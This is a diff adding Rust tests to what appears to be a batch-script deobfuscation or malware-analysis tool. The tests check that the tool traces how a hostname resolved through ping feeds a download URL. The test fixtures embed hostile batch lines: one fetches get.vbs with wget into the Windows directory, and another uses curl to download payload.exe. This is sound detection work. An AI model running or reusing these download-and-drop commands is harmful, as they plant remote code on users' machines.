@@ -5537,6 +5537,57 @@ for /F "tokens=1,2 delims==" %%A in (%CFG%) do echo key=%%A value=%%B
     }
 
     #[test]
+    fn for_f_ping_find_hostname_feeds_later_url_variable() {
+        let script = br#"for /f "tokens=1,2 delims=[]" %%A in ('ping config01.homepc.it ^| find "config01.homepc.it"') do set ipaddress=%%B
+set urlgit=http://%ipaddress%
+wget --no-check-certificate %urlgit%/win/get.vbs -O %windir%\get.vbs
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("ping config01.homepc.it")
+            )),
+            "ping pipeline should resolve synthetically: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://config01.homepc.it/win/get.vbs"
+                )
+            }),
+            "hostname from ping pipeline did not feed later URL: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_ping_options_still_find_target() {
+        let script =
+            br#"for /f "tokens=1,2 delims=[]" %%A in ('ping -4 -n 1 %ComputerName%') do echo %%B"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ping"))),
+            "ping options should not hide the target: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo MISCREANTTEARS"),
+            "ping target did not flow into bracket token: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
